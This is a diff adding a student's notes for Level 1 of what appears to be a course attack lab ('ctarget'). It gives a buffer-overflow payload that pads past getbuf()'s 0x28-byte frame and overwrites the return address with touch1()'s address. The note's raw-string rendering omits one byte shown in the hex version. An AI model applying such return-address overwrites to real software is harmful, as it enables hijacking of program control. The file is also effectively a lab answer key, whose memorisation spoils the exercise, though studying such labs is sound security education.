@@ -1,0 +1,9 @@
+ctarget:
+
+Level 1
+Bytes to be entered: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
+
+Raw string: \00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\C0@\00\00\00\00\00
+
+What I did with the string:
+The size of the stack frame allocated by getbuf() is 0x28 bytes, so the return address is stored in 0x28(%rsp). I just have to write at that address the starting address of the function touch1(), which is 0x4017c0. 
